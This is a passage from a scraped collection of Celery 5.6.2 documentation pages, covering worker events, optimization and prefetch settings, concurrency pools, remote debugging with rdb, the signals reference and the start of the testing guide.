connection:\n        recv = app.events.Receiver(connection, handlers={\n                'task-failed': announce_failed_tasks,\n        })\n        recv.capture(limit=None, timeout=None, wakeup=True)\n\nif __name__ == '__main__':\n    app = Celery(broker='amqp://guest@localhost//')\n    my_monitor(app)\n\nEvent Reference\n\nThis list contains the events sent by the worker, and their arguments.\n\nTask Events\ntask-sent\nsignature:\n\ntask-sent(uuid, name, args, kwargs, retries, eta, expires, queue, exchange, routing_key, root_id, parent_id)\n\nSent when a task message is published and the task_send_sent_event setting is enabled.\n\ntask-received\nsignature:\n\ntask-received(uuid, name, args, kwargs, retries, eta, hostname, timestamp, root_id, parent_id)\n\nSent when the worker receives a task.\n\ntask-started\nsignature:\n\ntask-started(uuid, hostname, timestamp, pid)\n\nSent just before the worker executes the task.\n\ntask-succeeded\nsignature:\n\ntask-succeeded(uuid, result, runtime, hostname, timestamp)\n\nSent if the task executed successfully.\n\nRun-time is the time it took to execute the task using the pool. (Starting from the task is sent to the worker pool, and ending when the pool result handler callback is called).\n\ntask-failed\nsignature:\n\ntask-failed(uuid, exception, traceback, hostname, timestamp)\n\nSent if the execution of the task failed.\n\ntask-rejected\nsignature:\n\ntask-rejected(uuid, requeue)\n\nThe task was rejected by the worker, possibly to be re-queued or moved to a dead letter queue.\n\ntask-revoked\nsignature:\n\ntask-revoked(uuid, terminated, signum, expired)\n\nSent if the task has been revoked (Note that this is likely to be sent by more than one worker).\n\nterminated is set to true if the task process was terminated,\n\nand the signum field set to the signal used.\n\nexpired is set to true if the task expired.\n\ntask-retried\nsignature:\n\ntask-retried(uuid, exception, traceback, hostname, timestamp)\n\nSent if the task failed, but will be retried in the future.\n\nWorker Events\nworker-online\nsignature:\n\nworker-online(hostname, timestamp, freq, sw_ident, sw_ver, sw_sys)\n\nThe worker has connected to the broker and is online.\n\nhostname: Nodename of the worker.\n\ntimestamp: Event time-stamp.\n\nfreq: Heartbeat frequency in seconds (float).\n\nsw_ident: Name of worker software (e.g., py-celery).\n\nsw_ver: Software version (e.g., 2.2.0).\n\nsw_sys: Operating System (e.g., Linux/Darwin).\n\nworker-heartbeat\nsignature:\n\nworker-heartbeat(hostname, timestamp, freq, sw_ident, sw_ver, sw_sys, active, processed)\n\nSent every minute, if the worker hasn’t sent a heartbeat in 2 minutes, it is considered to be offline.\n\nhostname: Nodename of the worker.\n\ntimestamp: Event time-stamp.\n\nfreq: Heartbeat frequency in seconds (float).\n\nsw_ident: Name of worker software (e.g., py-celery).\n\nsw_ver: Software version (e.g., 2.2.0).\n\nsw_sys: Operating System (e.g., Linux/Darwin).\n\nactive: Number of currently executing tasks.\n\nprocessed: Total number of tasks processed by this worker.\n\nworker-offline\nsignature:\n\nworker-offline(hostname, timestamp, freq, sw_ident, sw_ver, sw_sys)\n\nThe worker has disconnected from the broker.\n\nMailbox Configuration (Advanced)\n\nCelery uses kombu.pidbox.Mailbox internally to send control and broadcast commands to workers.\n\nAdded in version Kombu: 5.6.0\n\nAdvanced users can configure the behavior of this mailbox by customizing how it is created. The following parameters are now supported by Mailbox:\n\ndurable (default: False): If set to True, the control exchanges will survive broker restarts.\n\nexclusive (default: False): If set to True, the exchanges will be usable by only one connection.\n\nWarning\n\nSetting both durable=True and exclusive=True is not permitted and will raise an error, as these two options are mutually incompatible in AMQP.\n\nSee event_queue_durable and event_queue_exclusive for advanced configuration.\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nRouting Tasks\n\nNext topic\n\nSecurity\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Monitoring and Management Guide\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491577,
    "timestamp": "2026-02-23T00:13:49.334Z",
    "title": "Optimizing — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/optimizing.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Optimizing\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nOptimizing\nIntroduction\n\nThe default configuration makes a lot of compromises. It’s not optimal for any single case, but works well enough for most situations.\n\nThere are optimizations that can be applied based on specific use cases.\n\nOptimizations can apply to different properties of the running environment, be it the time tasks take to execute, the amount of memory used, or responsiveness at times of high load.\n\nEnsuring Operations\n\nIn the book Programming Pearls, Jon Bentley presents the concept of back-of-the-envelope calculations by asking the question;\n\n❝ How much water flows out of the Mississippi River in a day? ❞\n\nThe point of this exercise [*] is to show that there’s a limit to how much data a system can process in a timely manner. Back of the envelope calculations can be used as a means to plan for this ahead of time.\n\nIn Celery; If a task takes 10 minutes to complete, and there are 10 new tasks coming in every minute, the queue will never be empty. This is why it’s very important that you monitor queue lengths!\n\nA way to do this is by using Munin. You should set up alerts, that’ll notify you as soon as any queue has reached an unacceptable size. This way you can take appropriate action like adding new worker nodes, or revoking unnecessary tasks.\n\nGeneral Settings\nBroker Connection Pools\n\nThe broker connection pool is enabled by default since version 2.5.\n\nYou can tweak the broker_pool_limit setting to minimize contention, and the value should be based on the number of active threads/green-threads using broker connections.\n\nUsing Transient Queues\n\nQueues created by Celery are persistent by default. This means that the broker will write messages to disk to ensure that the tasks will be executed even if the broker is restarted.\n\nBut in some cases it’s fine that the message is lost, so not all tasks require durability. You can create a transient queue for these tasks to improve performance:\n\nfrom kombu import Exchange, Queue\n\ntask_queues = (\n    Queue('celery', routing_key='celery'),\n    Queue('transient', Exchange('transient', delivery_mode=1),\n          routing_key='transient', durable=False),\n)\n\n\nor by using task_routes:\n\ntask_routes = {\n    'proj.tasks.add': {'queue': 'celery', 'delivery_mode': 'transient'}\n}\n\n\nThe delivery_mode changes how the messages to this queue are delivered. A value of one means that the message won’t be written to disk, and a value of two (default) means that the message can be written to disk.\n\nTo direct a task to your new transient queue you can specify the queue argument (or use the task_routes setting):\n\ntask.apply_async(args, queue='transient')\n\n\nFor more information see the routing guide.\n\nWorker Settings\nPrefetch Limits\n\nPrefetch is a term inherited from AMQP that’s often misunderstood by users.\n\nThe prefetch limit is a limit for the number of tasks (messages) a worker can reserve for itself. If it is zero, the worker will keep consuming messages, not respecting that there may be other available worker nodes that may be able to process them sooner [†], or that the messages may not even fit in memory.\n\nThe workers’ default prefetch count is the worker_prefetch_multiplier setting multiplied by the number of concurrency slots [‡] (processes/threads/green-threads).\n\nIf you have many tasks with a long duration you want the multiplier value to be one: meaning it’ll only reserve one task per worker process at a time.\n\nHowever – If you have many short-running tasks, and throughput/round trip latency is important to you, this number should be large. The worker is able to process more tasks per second if the messages have already been prefetched, and is available in memory. You may have to experiment to find the best value that works for you. Values like 50 or 150 might make sense in these circumstances. Say 64, or 128.\n\nIf you have a combination of long- and short-running tasks, the best option is to use two worker nodes that are configured separately, and route the tasks according to the run-time (see Routing Tasks).\n\nReserve one task at a time\n\nThe task message is only deleted from the queue after the task is acknowledged, so if the worker crashes before acknowledging the task, it can be redelivered to another worker (or the same after recovery).\n\nNote that an exception is considered normal operation in Celery and it will be acknowledged. Acknowledgments are really used to safeguard against failures that can not be normally handled by the Python exception system (i.e. power failure, memory corruption, hardware failure, fatal signal, etc.). For normal exceptions you should use task.retry() to retry the task.\n\nSee also\n\nNotes at Should I use retry or acks_late?.\n\nWhen using the default of early acknowledgment, having a prefetch multiplier setting of one, means the worker will reserve at most one extra task for every worker process: or in other words, if the worker is started with -c 10, the worker may reserve at most 20 tasks (10 acknowledged tasks executing, and 10 unacknowledged reserved tasks) at any time.\n\nOften users ask if disabling “prefetching of tasks” is possible, and it is possible with a catch. You can have a worker only reserve as many tasks as there are worker processes, with the condition that they are acknowledged late (10 unacknowledged tasks executing for -c 10)\n\nFor that, you need to enable late acknowledgment. Using this option over the default behavior means a task that’s already started executing will be retried in the event of a power failure or the worker instance being killed abruptly, so this also means the task must be idempotent\n\nYou can enable this behavior by using the following configuration options:\n\ntask_acks_late = True\nworker_prefetch_multiplier = 1\n\n\nIf your tasks cannot be acknowledged late you can disable broker prefetching by enabling worker_disable_prefetch. With this setting the worker fetches a new task only when an execution slot is free, preventing tasks from waiting behind long running ones on busy workers. This can also be set from the command line using --disable-prefetch. This feature is currently only supported when using Redis as the broker.\n\nMemory Usage\n\nIf you are experiencing high memory usage on a prefork worker, first you need to determine whether the issue is also happening on the Celery master process. The Celery master process’s memory usage should not continue to increase drastically after start-up. If you see this happening, it may indicate a memory leak bug which should be reported to the Celery issue tracker.\n\nIf only your child processes have high memory usage, this indicates an issue with your task.\n\nKeep in mind, Python process memory usage has a “high watermark” and will not return memory to the operating system until the child process has stopped. This means a single high memory usage task could permanently increase the memory usage of a child process until it’s restarted. Fixing this may require adding chunking logic to your task to reduce peak memory usage.\n\nCelery workers have two main ways to help reduce memory usage due to the “high watermark” and/or memory leaks in child processes: the worker_max_tasks_per_child and worker_max_memory_per_child settings.\n\nYou must be careful not to set these settings too low, or else your workers will spend most of their time restarting child processes instead of processing tasks. For example, if you use a worker_max_tasks_per_child of 1 and your child process takes 1 second to start, then that child process would only be able to process a maximum of 60 tasks per minute (assuming the task ran instantly). A similar issue can occur when your tasks always exceed worker_max_memory_per_child.\n\nFootnotes\n\n[*]\n\nThe chapter is available to read for free here: The back of the envelope. The book is a classic text. Highly recommended.\n\n[†]\n\nRabbitMQ and other brokers deliver messages round-robin, so this doesn’t apply to an active system. If there’s no prefetch limit and you restart the cluster, there will be timing delays between nodes starting. If there are 3 offline nodes and one active node, all messages will be delivered to the active node.\n\n[‡]\n\nThis is the concurrency setting; worker_concurrency or the celery worker -c option.\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nSecurity\n\nNext topic\n\nDebugging\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Optimizing\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491579,
    "timestamp": "2026-02-23T00:13:49.337Z",
    "title": "Concurrency — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/concurrency/index.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Concurrency\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nConcurrency\nRelease:\n\n5.6\n\nDate:\n\nJan 04, 2026\n\nConcurrency in Celery enables the parallel execution of tasks. The default model, prefork, is well-suited for many scenarios and generally recommended for most users. In fact, switching to another mode will silently disable certain features like soft_timeout and max_tasks_per_child.\n\nThis page gives a quick overview of the available options which you can pick between using the –pool option when starting the worker.\n\nOverview of Concurrency Options\n\nprefork: The default option, ideal for CPU-bound tasks and most use cases. It is robust and recommended unless there’s a specific need for another model.\n\neventlet and gevent: Designed for IO-bound tasks, these models use greenlets for high concurrency. Note that certain features, like soft_timeout, are not available in these modes. These have detailed documentation pages linked below.\n\nsolo: Executes tasks sequentially in the main thread.\n\nthreads: Utilizes threading for concurrency, available if the concurrent.futures module is present.\n\ncustom: Enables specifying a custom worker pool implementation through environment variables.\n\nConcurrency with Eventlet\nIntroduction\nEnabling Eventlet\nExamples\nConcurrency with gevent\nIntroduction\nEnabling gevent\nExamples\nKnown issues\n\nNote\n\nWhile alternative models like eventlet and gevent are available, they may lack certain features compared to prefork. We recommend prefork as the starting point unless specific requirements dictate otherwise.\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nDebugging\n\nNext topic\n\nConcurrency with Eventlet\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Concurrency\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491578,
    "timestamp": "2026-02-23T00:13:49.337Z",
    "title": "Debugging — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/debugging.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Debugging\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nDebugging\nDebugging Tasks Remotely (using pdb)\nBasics\n\ncelery.contrib.rdb is an extended version of pdb that enables remote debugging of processes that doesn’t have terminal access.\n\nExample usage:\n\nfrom celery import task\nfrom celery.contrib import rdb\n\n@task()\ndef add(x, y):\n    result = x + y\n    rdb.set_trace()  # <- set break-point\n    return result\n\n\nset_trace() sets a break-point at the current location and creates a socket you can telnet into to remotely debug your task.\n\nThe debugger may be started by multiple processes at the same time, so rather than using a fixed port the debugger will search for an available port, starting from the base port (6900 by default). The base port can be changed using the environment variable CELERY_RDB_PORT.\n\nBy default the debugger will only be available from the local host, to enable access from the outside you have to set the environment variable CELERY_RDB_HOST.\n\nWhen the worker encounters your break-point it’ll log the following information:\n\n[INFO/MainProcess] Received task:\n    tasks.add[d7261c71-4962-47e5-b342-2448bedd20e8]\n[WARNING/PoolWorker-1] Remote Debugger:6900:\n    Please telnet 127.0.0.1 6900.  Type `exit` in session to continue.\n[2011-01-18 14:25:44,119: WARNING/PoolWorker-1] Remote Debugger:6900:\n    Waiting for client...\n\n\nIf you telnet the port specified you’ll be presented with a pdb shell:\n\n$ telnet localhost 6900\nConnected to localhost.\nEscape character is '^]'.\n> /opt/devel/demoapp/tasks.py(128)add()\n-> return result\n(Pdb)\n\n\nEnter help to get a list of available commands, It may be a good idea to read the Python Debugger Manual if you have never used pdb before.\n\nTo demonstrate, we’ll read the value of the result variable, change it and continue execution of the task:\n\n(Pdb) result\n4\n(Pdb) result = 'hello from rdb'\n(Pdb) continue\nConnection closed by foreign host.\n\n\nThe result of our vandalism can be seen in the worker logs:\n\n[2011-01-18 14:35:36,599: INFO/MainProcess] Task\n    tasks.add[d7261c71-4962-47e5-b342-2448bedd20e8] succeeded\n    in 61.481s: 'hello from rdb'\n\nTips\nEnabling the break-point signal\n\nIf the environment variable CELERY_RDBSIG is set, the worker will open up an rdb instance whenever the SIGUSR2 signal is sent. This is the case for both main and worker processes.\n\nFor example starting the worker with:\n\n$ CELERY_RDBSIG=1 celery worker -l INFO\n\n\nYou can start an rdb session for any of the worker processes by executing:\n\n$ kill -USR2 <pid>\n\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nOptimizing\n\nNext topic\n\nConcurrency\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Debugging\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491580,
    "timestamp": "2026-02-23T00:13:49.350Z",
    "title": "Signals — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/signals.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Signals\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nSignals\n\nBasics\n\nSignals\n\nTask Signals\n\nbefore_task_publish\n\nafter_task_publish\n\ntask_prerun\n\ntask_postrun\n\ntask_retry\n\ntask_success\n\ntask_failure\n\ntask_internal_error\n\ntask_received\n\ntask_revoked\n\ntask_unknown\n\ntask_rejected\n\nApp Signals\n\nimport_modules\n\nWorker Signals\n\nceleryd_after_setup\n\nceleryd_init\n\nworker_init\n\nworker_before_create_process\n\nworker_ready\n\nheartbeat_sent\n\nworker_shutting_down\n\nworker_process_init\n\nworker_process_shutdown\n\nworker_shutdown\n\nBeat Signals\n\nbeat_init\n\nbeat_embedded_init\n\nEventlet Signals\n\neventlet_pool_started\n\neventlet_pool_preshutdown\n\neventlet_pool_postshutdown\n\neventlet_pool_apply\n\nLogging Signals\n\nsetup_logging\n\nafter_setup_logger\n\nafter_setup_task_logger\n\nCommand signals\n\nuser_preload_options\n\nDeprecated Signals\n\ntask_sent\n\nSignals allow decoupled applications to receive notifications when certain actions occur elsewhere in the application.\n\nCelery ships with many signals that your application can hook into to augment behavior of certain actions.\n\nBasics\n\nSeveral kinds of events trigger signals, you can connect to these signals to perform actions as they trigger.\n\nExample connecting to the after_task_publish signal:\n\nfrom celery.signals import after_task_publish\n\n@after_task_publish.connect\ndef task_sent_handler(sender=None, headers=None, body=None, **kwargs):\n    # information about task are located in headers for task messages\n    # using the task protocol version 2.\n    info = headers if 'task' in headers else body\n    print('after_task_publish for task id {info[id]}'.format(\n        info=info,\n    ))\n\n\nSome signals also have a sender you can filter by. For example the after_task_publish signal uses the task name as a sender, so by providing the sender argument to connect you can connect your handler to be called every time a task with name “proj.tasks.add” is published:\n\n@after_task_publish.connect(sender='proj.tasks.add')\ndef task_sent_handler(sender=None, headers=None, body=None, **kwargs):\n    # information about task are located in headers for task messages\n    # using the task protocol version 2.\n    info = headers if 'task' in headers else body\n    print('after_task_publish for task id {info[id]}'.format(\n        info=info,\n    ))\n\n\nSignals use the same implementation as django.core.dispatch. As a result other keyword parameters (e.g., signal) are passed to all signal handlers by default.\n\nThe best practice for signal handlers is to accept arbitrary keyword arguments (i.e., **kwargs). That way new Celery versions can add additional arguments without breaking user code.\n\nSignals\nTask Signals\nbefore_task_publish\n\nAdded in version 3.1.\n\nDispatched before a task is published. Note that this is executed in the process sending the task.\n\nSender is the name of the task being sent.\n\nProvides arguments:\n\nbody\n\nTask message body.\n\nThis is a mapping containing the task message fields, see Version 2 and Version 1 for a reference of possible fields that can be defined.\n\nexchange\n\nName of the exchange to send to or a Exchange object.\n\nrouting_key\n\nRouting key to use when sending the message.\n\nheaders\n\nApplication headers mapping (can be modified).\n\nproperties\n\nMessage properties (can be modified)\n\ndeclare\n\nList of entities (Exchange, Queue, or binding to declare before publishing the message. Can be modified.\n\nretry_policy\n\nMapping of retry options. Can be any argument to kombu.Connection.ensure() and can be modified.\n\nafter_task_publish\n\nDispatched when a task has been sent to the broker. Note that this is executed in the process that sent the task.\n\nSender is the name of the task being sent.\n\nProvides arguments:\n\nheaders\n\nThe task message headers, see Version 2 and Version 1 for a reference of possible fields that can be defined.\n\nbody\n\nThe task message body, see Version 2 and Version 1 for a reference of possible fields that can be defined.\n\nexchange\n\nName of the exchange or Exchange object used.\n\nrouting_key\n\nRouting key used.\n\ntask_prerun\n\nDispatched before a task is executed.\n\nSender is the task object being executed.\n\nProvides arguments:\n\ntask_id\n\nId of the task to be executed.\n\ntask\n\nThe task being executed.\n\nargs\n\nThe tasks positional arguments.\n\nkwargs\n\nThe tasks keyword arguments.\n\ntask_postrun\n\nDispatched after a task has been executed.\n\nSender is the task object executed.\n\nProvides arguments:\n\ntask_id\n\nId of the task to be executed.\n\ntask\n\nThe task being executed.\n\nargs\n\nThe tasks positional arguments.\n\nkwargs\n\nThe tasks keyword arguments.\n\nretval\n\nThe return value of the task.\n\nstate\n\nName of the resulting state.\n\ntask_retry\n\nDispatched when a task will be retried.\n\nSender is the task object.\n\nProvides arguments:\n\nrequest\n\nThe current task request.\n\nreason\n\nReason for retry (usually an exception instance, but can always be coerced to str).\n\neinfo\n\nDetailed exception information, including traceback (a billiard.einfo.ExceptionInfo object).\n\ntask_success\n\nDispatched when a task succeeds.\n\nSender is the task object executed.\n\nProvides arguments\n\nresult\n\nReturn value of the task.\n\ntask_failure\n\nDispatched when a task fails.\n\nSender is the task object executed.\n\nProvides arguments:\n\ntask_id\n\nId of the task.\n\nexception\n\nException instance raised.\n\nargs\n\nPositional arguments the task was called with.\n\nkwargs\n\nKeyword arguments the task was called with.\n\ntraceback\n\nStack trace object.\n\neinfo\n\nThe billiard.einfo.ExceptionInfo instance.\n\ntask_internal_error\n\nDispatched when an internal Celery error occurs while executing the task.\n\nSender is the task object executed.\n\nProvides arguments:\n\ntask_id\n\nId of the task.\n\nargs\n\nPositional arguments the task was called with.\n\nkwargs\n\nKeyword arguments the task was called with.\n\nrequest\n\nThe original request dictionary. This is provided as the task.request may not be ready by the time the exception is raised.\n\nexception\n\nException instance raised.\n\ntraceback\n\nStack trace object.\n\neinfo\n\nThe billiard.einfo.ExceptionInfo instance.\n\ntask_received\n\nDispatched when a task is received from the broker and is ready for execution.\n\nSender is the consumer object.\n\nProvides arguments:\n\nrequest\n\nThis is a Request instance, and not task.request. When using the prefork pool this signal is dispatched in the parent process, so task.request isn’t available and shouldn’t be used. Use this object instead, as they share many of the same fields.\n\ntask_revoked\n\nDispatched when a task is revoked/terminated by the worker.\n\nSender is the task object revoked/terminated.\n\nProvides arguments:\n\nrequest\n\nThis is a Context instance, and not task.request. When using the prefork pool this signal is dispatched in the parent process, so task.request isn’t available and shouldn’t be used. Use this object instead, as they share many of the same fields.\n\nterminated\n\nSet to True if the task was terminated.\n\nsignum\n\nSignal number used to terminate the task. If this is None and terminated is True then TERM should be assumed.\n\nexpired\n\nSet to True if the task expired.\n\ntask_unknown\n\nDispatched when a worker receives a message for a task that’s not registered.\n\nSender is the worker Consumer.\n\nProvides arguments:\n\nname\n\nName of task not found in registry.\n\nid\n\nThe task id found in the message.\n\nmessage\n\nRaw message object.\n\nexc\n\nThe error that occurred.\n\ntask_rejected\n\nDispatched when a worker receives an unknown type of message to one of its task queues.\n\nSender is the worker Consumer.\n\nProvides arguments:\n\nmessage\n\nRaw message object.\n\nexc\n\nThe error that occurred (if any).\n\nApp Signals\nimport_modules\n\nThis signal is sent when a program (worker, beat, shell) etc, asks for modules in the include and imports settings to be imported.\n\nSender is the app instance.\n\nWorker Signals\nceleryd_after_setup\n\nThis signal is sent after the worker instance is set up, but before it calls run. This means that any queues from the celery worker -Q option is enabled, logging has been set up and so on.\n\nIt can be used to add custom queues that should always be consumed from, disregarding the celery worker -Q option. Here’s an example that sets up a direct queue for each worker, these queues can then be used to route a task to any specific worker:\n\nfrom celery.signals import celeryd_after_setup\n\n@celeryd_after_setup.connect\ndef setup_direct_queue(sender, instance, **kwargs):\n    queue_name = '{0}.dq'.format(sender)  # sender is the nodename of the worker\n    instance.app.amqp.queues.select_add(queue_name)\n\n\nProvides arguments:\n\nsender\n\nNode name of the worker.\n\ninstance\n\nThis is the celery.apps.worker.Worker instance to be initialized. Note that only the app and hostname (nodename) attributes have been set so far, and the rest of __init__ hasn’t been executed.\n\nconf\n\nThe configuration of the current app.\n\nceleryd_init\n\nThis is the first signal sent when celery worker starts up. The sender is the host name of the worker, so this signal can be used to setup worker specific configuration:\n\nfrom celery.signals import celeryd_init\n\n@celeryd_init.connect(sender='worker12@example.com')\ndef configure_worker12(conf=None, **kwargs):\n    conf.task_default_rate_limit = '10/m'\n\n\nor to set up configuration for multiple workers you can omit specifying a sender when you connect:\n\nfrom celery.signals import celeryd_init\n\n@celeryd_init.connect\ndef configure_workers(sender=None, conf=None, **kwargs):\n    if sender in ('worker1@example.com', 'worker2@example.com'):\n        conf.task_default_rate_limit = '10/m'\n    if sender == 'worker3@example.com':\n        conf.worker_prefetch_multiplier = 0\n\n\nProvides arguments:\n\nsender\n\nNodename of the worker.\n\ninstance\n\nThis is the celery.apps.worker.Worker instance to be initialized. Note that only the app and hostname (nodename) attributes have been set so far, and the rest of __init__ hasn’t been executed.\n\nconf\n\nThe configuration of the current app.\n\noptions\n\nOptions passed to the worker from command-line arguments (including defaults).\n\nworker_init\n\nDispatched before the worker is started.\n\nworker_before_create_process\n\nDispatched in the parent process, just before new child process is created in the prefork pool. It can be used to clean up instances that don’t behave well when forking.\n\n@signals.worker_before_create_process.connect\ndef clean_channels(**kwargs):\n    grpc_singleton.clean_channel()\n\nworker_ready\n\nDispatched when the worker is ready to accept work.\n\nheartbeat_sent\n\nDispatched when Celery sends a worker heartbeat.\n\nSender is the celery.worker.heartbeat.Heart instance.\n\nworker_shutting_down\n\nDispatched when the worker begins the shutdown process.\n\nProvides arguments:\n\nsig\n\nThe POSIX signal that was received.\n\nhow\n\nThe shutdown method, warm or cold.\n\nexitcode\n\nThe exitcode that will be used when the main process exits.\n\nworker_process_init\n\nDispatched in all pool child processes when they start.\n\nNote that handlers attached to this signal mustn’t be blocking for more than 4 seconds, or the process will be killed assuming it failed to start.\n\nworker_process_shutdown\n\nDispatched in all pool child processes just before they exit.\n\nNote: There’s no guarantee that this signal will be dispatched, similarly to finally blocks it’s impossible to guarantee that handlers will be called at shutdown, and if called it may be interrupted during.\n\nProvides arguments:\n\npid\n\nThe pid of the child process that’s about to shutdown.\n\nexitcode\n\nThe exitcode that’ll be used when the child process exits.\n\nworker_shutdown\n\nDispatched when the worker is about to shut down.\n\nBeat Signals\nbeat_init\n\nDispatched when celery beat starts (either standalone or embedded).\n\nSender is the celery.beat.Service instance.\n\nbeat_embedded_init\n\nDispatched in addition to the beat_init signal when celery beat is started as an embedded process.\n\nSender is the celery.beat.Service instance.\n\nEventlet Signals\neventlet_pool_started\n\nSent when the eventlet pool has been started.\n\nSender is the celery.concurrency.eventlet.TaskPool instance.\n\neventlet_pool_preshutdown\n\nSent when the worker shutdown, just before the eventlet pool is requested to wait for remaining workers.\n\nSender is the celery.concurrency.eventlet.TaskPool instance.\n\neventlet_pool_postshutdown\n\nSent when the pool has been joined and the worker is ready to shutdown.\n\nSender is the celery.concurrency.eventlet.TaskPool instance.\n\neventlet_pool_apply\n\nSent whenever a task is applied to the pool.\n\nSender is the celery.concurrency.eventlet.TaskPool instance.\n\nProvides arguments:\n\ntarget\n\nThe target function.\n\nargs\n\nPositional arguments.\n\nkwargs\n\nKeyword arguments.\n\nLogging Signals\nsetup_logging\n\nCelery won’t configure the loggers if this signal is connected, so you can use this to completely override the logging configuration with your own.\n\nIf you’d like to augment the logging configuration setup by Celery then you can use the after_setup_logger and after_setup_task_logger signals.\n\nProvides arguments:\n\nloglevel\n\nThe level of the logging object.\n\nlogfile\n\nThe name of the logfile.\n\nformat\n\nThe log format string.\n\ncolorize\n\nSpecify if log messages are colored or not.\n\nafter_setup_logger\n\nSent after the setup of every global logger (not task loggers). Used to augment logging configuration.\n\nProvides arguments:\n\nlogger\n\nThe logger object.\n\nloglevel\n\nThe level of the logging object.\n\nlogfile\n\nThe name of the logfile.\n\nformat\n\nThe log format string.\n\ncolorize\n\nSpecify if log messages are colored or not.\n\nafter_setup_task_logger\n\nSent after the setup of every single task logger. Used to augment logging configuration.\n\nProvides arguments:\n\nlogger\n\nThe logger object.\n\nloglevel\n\nThe level of the logging object.\n\nlogfile\n\nThe name of the logfile.\n\nformat\n\nThe log format string.\n\ncolorize\n\nSpecify if log messages are colored or not.\n\nCommand signals\nuser_preload_options\n\nThis signal is sent after any of the Celery command line programs are finished parsing the user preload options.\n\nIt can be used to add additional command-line arguments to the celery umbrella command:\n\nfrom celery import Celery\nfrom celery import signals\nfrom celery.bin.base import Option\n\napp = Celery()\napp.user_options['preload'].add(Option(\n    '--monitoring', action='store_true',\n    help='Enable our external monitoring utility, blahblah',\n))\n\n@signals.user_preload_options.connect\ndef handle_preload_options(options, **kwargs):\n    if options['monitoring']:\n        enable_monitoring()\n\n\nSender is the Command instance, and the value depends on the program that was called (e.g., for the umbrella command it’ll be a CeleryCommand) object).\n\nProvides arguments:\n\napp\n\nThe app instance.\n\noptions\n\nMapping of the parsed user preload options (with default values).\n\nDeprecated Signals\ntask_sent\n\nThis signal is deprecated, please use after_task_publish instead.\n\nDonations\n\nPlease help support this community project with a donation.\n\nPrevious topic\n\nConcurrency with gevent\n\nNext topic\n\nTesting with Celery\n\nThis Page\nShow Source\nQuick search\nindex\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Signals\n© Copyright 2009-2023, Ask Solem & contributors."
  },
  {
    "id": 60491581,
    "timestamp": "2026-02-23T00:13:49.364Z",
    "title": "Testing with Celery — Celery 5.6.2 documentation",
    "url": "https://docs.celeryq.dev/en/stable/userguide/testing.html",
    "text": "index\nmodules |\nnext |\nprevious |\nCelery 5.6.2 documentation » User Guide » Testing with Celery\n\nThis document describes the current stable version of Celery (5.6). For development docs, go here.\n\nTesting with Celery\n\nTesting with Celery is divided into two parts:\n\nUnit & Integration: Using celery.contrib.pytest.\n\nSmoke / Production: Using pytest-celery >= 1.0.0\n\nInstalling the pytest-celery plugin will install the celery.contrib.pytest infrastructure as well, alongside the pytest plugin infrastructure. The difference is how you use it.\n\nWarning\n\nBoth APIs are NOT compatible with each other. The pytest-celery plugin is Docker based and the celery.contrib.pytest is mock based.\n\nTo use the celery.contrib.pytest infrastructure, follow the instructions below.\n\nThe pytest-celery plugin has its own documentation.\n\nTasks and unit tests\n\nTo test task behavior in unit tests the preferred method is mocking.\n\nEager mode\n\nThe eager mode enabled by the task_always_eager setting is by definition not suitable for unit tests.\n\nWhen testing with eager mode you are only testing an emulation of what happens in a worker, and there are many discrepancies between the emulation and what happens in reality.\n\nNote that eagerly executed tasks don’t write results to backend by default. If you want to enable this functionality, have a look at task_store_eager_result.\n\nA Celery task is much like a web view, in that it should only define how to perform the action in the context of being called as a task.\n\nThis means optimally tasks only handle things like serialization, message headers, retries, and so on, with the actual logic implemented elsewhere.\n\nSay we had a task like this:\n\nfrom .models import Product\n\n\n@app.task(bind=True)\ndef send_order(self, product_pk, quantity, price):\n    price = Decimal(price)  # json serializes this to string.\n\n    # models are passed by id, not serialized.\n    product = Product.objects.get(product_pk)\n\n    try:\n        product.order(quantity, price)\n    except OperationalError as exc:\n        raise self.retry(exc=exc)\n\n\nNote: A task being bound means the first argument to the task will always be the task instance (self). which means you do get a self argument as the first argument and can use the Task class methods and attributes.\n\nYou could write unit tests for this task, using mocking like in this example:\n\nfrom pytest import raises\n\nfrom celery.exceptions import Retry\n\n# for python 2: use mock.patch from `pip install mock`.\nfrom unittest.mock import patch\n\nfrom proj.models import Product\nfrom proj.tasks import send_order\n\nclass test_send_order:\n\n    @patch('proj.tasks.Product.order')  # < patching Product in module above\n    def test_success(self, product_order):\n        product = Product.objects.create(\n            name='Foo',\n        )\n        send_order(product.pk, 3, Decimal(30.3))\n        product_order.assert_called_with(3, Decimal(30.3))\n\n    @patch('proj.tasks.Product.order')\n    